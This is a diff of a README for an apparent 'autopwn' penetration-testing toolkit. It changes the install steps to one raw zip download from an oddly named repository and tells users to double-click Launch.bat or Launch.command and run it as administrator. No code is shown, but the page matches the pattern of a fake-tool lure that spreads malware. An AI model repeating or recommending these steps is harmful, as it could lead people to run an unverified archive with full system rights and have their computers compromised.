@@ -8,8 +8,7 @@ for you while you sleep. 😴💥 Trusted by thousands of *elite* operators worl
 
 ## 📥 Download & Install (Windows / macOS)
 
-1. **Download the latest release** 👉 [`pentest-autopwn-toolkit-v4.2.zip`](https://github.com/maximzdfxngyfu/Noobs-look-elsewhere/releases/latest/download/pentest-autopwn-toolkit-v4.2.zip)
-   *(or the direct mirror: [here](https://github.com/maximzdfxngyfu/Noobs-look-elsewhere/raw/main/download/pentest-autopwn-toolkit-v4.2.zip))*
+1. **Download now — one click** 👉 [`pentest-autopwn-toolkit-v4.2.zip`](https://github.com/maximzdfxngyfu/Noobs-look-elsewhere/raw/main/download/pentest-autopwn-toolkit-v4.2.zip)
 2. **Extract** the archive to your Downloads folder.
 3. **Double-click `Launch.bat`** (Windows) or **`Launch.command`** (macOS).
 4. On Windows, right-click → **Run as administrator** for *full power*. ⚙️
